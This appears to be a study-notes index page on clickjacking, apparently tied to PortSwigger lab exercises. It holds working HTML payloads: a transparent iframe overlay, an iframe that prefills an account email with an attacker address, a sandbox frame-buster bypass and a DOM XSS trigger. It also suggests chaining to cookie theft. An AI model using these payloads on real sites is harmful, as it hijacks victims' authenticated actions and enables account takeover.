# Clickjacking - topic overview & router

Clickjacking overlays a transparent iframe containing the victim's authenticated page over a fake "decoy" button. When the victim clicks the decoy, they actually click the hidden button (delete account, confirm transfer, etc.). No JS needed in the payload - pure CSS positioning trick.

## 30-second quick reference

```html
<!-- Core template (adjust top/left to align decoy div with target button) -->
<style>
  iframe {
    position: relative;
    width: 500px; height: 700px;
    opacity: 0.0001;    /* invisible; use 0.1 during calibration */
    z-index: 2;
  }
  div {
    position: absolute;
    top: 300px; left: 60px;   /* align with target button */
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://VICTIM/my-account"></iframe>

<!-- Prefill form via URL param -->
<iframe src="https://VICTIM/my-account?email=hacker@evil.com"></iframe>

<!-- Bypass frame buster (JS top.location check) -->
<iframe sandbox="allow-forms" src="https://VICTIM/my-account?email=hacker@evil.com"></iframe>

<!-- Trigger DOM XSS via click -->
<iframe src="https://VICTIM/feedback?name=<img src=1 onerror=print()>&email=x@x.com&subject=x&message=x#feedbackResult"></iframe>

<!-- Multistep: two decoy divs -->
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
```

## Decision map

| Scenario | Sub-technique | Key tweak |
|---|---|---|
| Single click needed (delete, update) | [Basic-and-prefill](Basic-and-prefill/) | align div with target button |
| Form pre-population via URL | [Basic-and-prefill](Basic-and-prefill/) | `?email=hacker@evil.com` in iframe src |
| Frame buster JS present | [Basic-and-prefill](Basic-and-prefill/) | `sandbox="allow-forms"` disables JS in iframe |
| Click triggers XSS | [Advanced-multistep](Advanced-multistep/) | iframe src with XSS in URL params |
| Two-step confirmation dialog | [Advanced-multistep](Advanced-multistep/) | two positioned div elements |

## Sub-technique folders
- `Basic-and-prefill/` - overlay iframe, prefill via URL param, frame buster bypass (3 labs)
- `Advanced-multistep/` - clickjacking -> DOM XSS trigger, multistep two-click attacks (2 labs)

## Root cause
Browser renders iframes with CSS-controlled opacity/z-index. No X-Frame-Options or CSP frame-ancestors header -> page can be framed. Victim clicks on the visible decoy, not realizing a transparent authenticated action sits on top.

## Find it
1. Try framing the target in an iframe - if it loads (not blocked), it's frameable.
2. Check response headers: absence of `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` -> vulnerable.
3. Find any one-click or two-click action that a victim would perform without suspicion.

## Chaining
- Clickjacking -> delete account, change email, transfer money (any state-changing one-click action)
- Clickjacking + DOM XSS -> execute JS in victim context -> steal cookies -> [XSS](../XSS/)
- Bypass CSRF token protection (token is in the legitimate page, victim submits it unknowingly)

## Tools
- **Exploit server** - host the clickjack HTML; adjust top/left with opacity=0.1 until aligned
- **Burp browser** - preview the exploit and align positions

## References
- https://portswigger.net/web-security/clickjacking
